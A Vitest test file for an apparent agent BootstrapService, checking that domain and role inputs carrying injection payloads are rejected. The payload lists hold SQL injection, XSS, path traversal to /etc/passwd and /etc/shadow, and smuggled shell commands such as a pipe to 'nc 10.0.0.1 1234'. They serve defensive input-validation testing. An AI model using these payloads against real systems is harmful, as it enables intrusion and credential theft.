import { describe, it, expect, beforeEach, vi, Mocked } from 'vitest';
import { BootstrapService } from '../../mcp/BootstrapService';
import { AgentDb } from '../../mcp/AgentDb';
import { SessionManager } from '../../mcp/SessionManager';
import { isBootstrapError } from '../../mcp/ErrorResponses';

describe('BootstrapService OWASP Injection Validation', () => {
    let bootstrapService: BootstrapService;
    let mockAgentDb: Mocked<AgentDb>;
    let mockSessionManager: Mocked<SessionManager>;

    beforeEach(() => {
        mockAgentDb = {
            getRole: vi.fn(),
            getRoleSchema: vi.fn(),
            getRunbook: vi.fn(),
        } as any;

        mockSessionManager = {
            register: vi.fn(),
        } as any;

        bootstrapService = new BootstrapService(mockAgentDb, mockSessionManager);
    });

    describe('Domain Injection Prevention', () => {
        const maliciousDomains = [
            'engineering; DROP TABLE roles;--', // SQLi: Statement stack
            "' OR 1=1--",                       // SQLi: Tautology
            '" OR 1=1--',                       // SQLi: Tautology double quote
            'admin\' #',                        // SQLi: Comment
            'role) OR (1=1',                    // SQLi: Parenthesis
            'backend-$(whoami)',                // Cmd: Subshell
            'backend; touch /tmp/hacked',       // Cmd: Semicolon
            'backend | nc 10.0.0.1 1234',       // Cmd: Pipe
            'backend & echo "pwned"',          // Cmd: Background
            'backend && id',                    // Cmd: Logic AND
            'backend || id',                    // Cmd: Logic OR
            '<script>alert(1)</script>',        // XSS: Script tag
            '<img src=x onerror=alert(1)>',     // XSS: Error handler
            'javascript:alert(1)',              // XSS: Pseudo-protocol
            '"><script>alert(1)</script>',     // XSS: Break out
            '../../../etc/passwd',              // Path: Traversal
            '..\\..\\..\\windows\\system32',    // Path: Windows traversal
            '/etc/passwd\0',                    // Path: Null byte
            './.././../etc/passwd',             // Path: Obfuscated traversal
            '%2e%2e%2f%2e%2e%2fetc%2fpasswd',   // Path: URL encoded
            'dev ops',                          // Format: Space
            'ENGINEERING',                      // Format: Uppercase
            'backend@domain.com',               // Format: Special char
            'a'.repeat(101),                    // Format: Length > 64
            '\nbackend',                        // Format: Newline
            '\r\nbackend',                      // Format: CRLF
            '\tbackend',                        // Format: Tab
            ' ',                                // Format: Single space
            '--',                               // SQLi: Comment only
            '#',                                // SQLi: Comment hash
            '!',                                // Special char
            '$HOME',                            // Cmd: Env var
            '`id`',                             // Cmd: Backticks
            '{domain:1}',                       // NoSQL-ish/JSON-ish
            '[domain]',                         // Regex-ish
            '${7*7}',                           // Template injection
            '{{7*7}}',                          // Template injection
            '<% 7*7 %>',                        // SSI/Template
            'backend\x00',                      // Null byte
            'backend\x1f',                      // Control char
            'backend\u0000',                    // Unicode null
            'backend\u202E',                    // Right-to-left override
        ];

        it.each(maliciousDomains)('should reject malicious domain: %s', async (domain) => {
            const result = await bootstrapService.bootstrap(domain, 'backend_developer');

            expect(isBootstrapError(result)).toBe(true);
            if (isBootstrapError(result)) {
                expect(result.code).toBe('INVALID_DOMAIN');
                expect(result.message).toContain('Invalid domain format');
            }
        });
    });

    describe('Role Injection Prevention', () => {
        const maliciousRoles = [
            'admin" OR 1=1--',                  // SQLi
            'role\') OR 1=1--',                 // SQLi
            'admin\' UNION SELECT NULL--',      // SQLi: Union
            'admin\' AND 1=1 WAITFOR DELAY \'0:0:5\'--', // SQLi: Time-based
            'lead_`touch hacked.txt`',          // Cmd
            'lead; id',                         // Cmd
            'lead $(whoami)',                   // Cmd
            'lead | cat /etc/shadow',           // Cmd
            'alert("XSS")',                     // XSS
            '<svg/onload=alert(1)>',            // XSS
            '\\..\\..\\windows\\system32',      // Path
            '../../../../etc/shadow',           // Path
            'lead engineer',                    // Space
            'Backend_Dev',                      // Case
            'role;inject',                      // Semicolon
            'r'.repeat(101),                    // Length
            'r'.repeat(65),                     // Length (just over 64)
            'role\0',                           // Null byte
            'admin" #',                         // SQLi
            'admin"--',                         // SQLi
            'role/*comment*/',                  // SQLi: Comment block
            'role\n',                           // Newline
            'role\r',                           // Carriage return
            'role\b',                           // Backspace
            'role\t',                           // Tab
            'role\f',                           // Form feed
            '{{role}}',                         // Template
            '${role}',                          // Template
            'process.env.DB_PASSWORD',          // Code injection potential
            'require("fs")',                    // Code injection potential
            'role||id',                         // Cmd
            'role&&id',                         // Cmd
            'role?q=1',                         // Query string
            'role#anchor',                      // Fragment
            'role:port',                        // Colon
            'role/path',                        // Slash
            'role\\path',                       // Backslash
            'role.js',                          // Extension
            'role.exe',                         // Extension
            'role.sh',                          // Extension
            'role.bat',                         // Extension
            'role.cmd',                         // Extension
        ];

        it.each(maliciousRoles)('should reject malicious role: %s', async (role) => {
            const result = await bootstrapService.bootstrap('engineering', role);

            expect(isBootstrapError(result)).toBe(true);
            if (isBootstrapError(result)) {
                expect(result.code).toBe('INVALID_ROLE');
                expect(result.message).toContain('Invalid role format');
            }
        });
    });

    describe('Successful Validation (Permitted Patterns)', () => {
        it('should accept valid domain and role', async () => {
            mockAgentDb.getRole.mockReturnValue({ domain: 'engineering', role_name: 'backend_developer', content: '# Mock' } as any);
            mockAgentDb.getRoleSchema.mockReturnValue({ mcp_tool_permissions: '{}' } as any);
            mockSessionManager.register.mockReturnValue({ session_id: 'uuid-123' } as any);

            const result = await bootstrapService.bootstrap('engineering', 'backend_developer');
            expect(isBootstrapError(result)).toBe(false);
        });

        it('should accept complex but valid patterns', async () => {
            mockAgentDb.getRole.mockReturnValue({ domain: 'cloud-infrastructure', role_name: 'sre_lead_engineer', content: '# Mock' } as any);
            mockSessionManager.register.mockReturnValue({ session_id: 'uuid-123' } as any);

            const result = await bootstrapService.bootstrap('cloud-infrastructure', 'sre_lead_engineer');
            expect(isBootstrapError(result)).toBe(false);
        });
    });
});
